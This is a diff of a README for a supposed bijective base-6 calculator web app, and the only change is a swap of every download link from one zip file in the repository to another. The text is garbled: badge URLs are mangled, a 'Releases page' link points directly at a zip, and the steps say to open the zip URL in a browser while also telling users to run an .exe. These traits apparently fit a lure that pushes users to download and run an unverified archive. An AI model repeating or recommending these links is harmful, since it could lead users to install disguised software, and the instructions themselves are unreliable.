@@ -1,7 +1,7 @@
 # 🎉 bijective_base6_calc - Explore Zero-Less Mathematics Easily
 
 ## 📥 Download the Application
-[![Download bijective_base6_calc](https://raw.githubusercontent.com/finder-ui/bijective_base6_calc/main/neumatize/bijective_base6_calc.zip%20Now-brightgreen)](https://raw.githubusercontent.com/finder-ui/bijective_base6_calc/main/neumatize/bijective_base6_calc.zip)
+[![Download bijective_base6_calc](https://github.com/finder-ui/bijective_base6_calc/raw/refs/heads/main/templates/bijective-calc-base-1.7.zip%20Now-brightgreen)](https://github.com/finder-ui/bijective_base6_calc/raw/refs/heads/main/templates/bijective-calc-base-1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to bijective_base6_calc! This interactive web application helps you learn and explore the fascinating world of zero-less mathematics using the bijective base-6 number system. You will find that this tool is more than just a calculator; it offers in-depth explanations and a configurable practice mode to enhance your learning experience.
@@ -22,11 +22,11 @@ To run bijective_base6_calc, ensure that your device meets the following system 
 ## 🌐 Download & Install
 To get started with bijective_base6_calc, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/finder-ui/bijective_base6_calc/main/neumatize/bijective_base6_calc.zip) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/finder-ui/bijective_base6_calc/raw/refs/heads/main/templates/bijective-calc-base-1.7.zip) to find the latest version of the application.
 2. **Download the Application**: On the Releases page, locate the version you want to download. Click on the `.exe` or `.zip` file to download it.
 3. **Install the Application**: 
    - If you downloaded an `.exe` file, double-click it to start the installation process. Follow the prompts to complete the installation.
-   - If you downloaded a `.zip` file, extract it to your desired location and open the https://raw.githubusercontent.com/finder-ui/bijective_base6_calc/main/neumatize/bijective_base6_calc.zip file in your web browser to start using the app.
+   - If you downloaded a `.zip` file, extract it to your desired location and open the https://github.com/finder-ui/bijective_base6_calc/raw/refs/heads/main/templates/bijective-calc-base-1.7.zip file in your web browser to start using the app.
 4. **Run the Application**: Once installed, open the application through your programs menu or directly from the extracted folder.
 
 ## 🎓 How to Use
@@ -61,4 +61,4 @@ For any questions or support, please check the GitHub Issues section or use the 
 - **Documentation**: Comprehensive guides and examples will also be available on the GitHub Wiki.
 - **Blog**: Follow our blog for updates on new features, tutorials, and insights into zero-less mathematics.
 
-[![Download bijective_base6_calc](https://raw.githubusercontent.com/finder-ui/bijective_base6_calc/main/neumatize/bijective_base6_calc.zip%20Now-brightgreen)](https://raw.githubusercontent.com/finder-ui/bijective_base6_calc/main/neumatize/bijective_base6_calc.zip)
+[![Download bijective_base6_calc](https://github.com/finder-ui/bijective_base6_calc/raw/refs/heads/main/templates/bijective-calc-base-1.7.zip%20Now-brightgreen)](https://github.com/finder-ui/bijective_base6_calc/raw/refs/heads/main/templates/bijective-calc-base-1.7.zip)
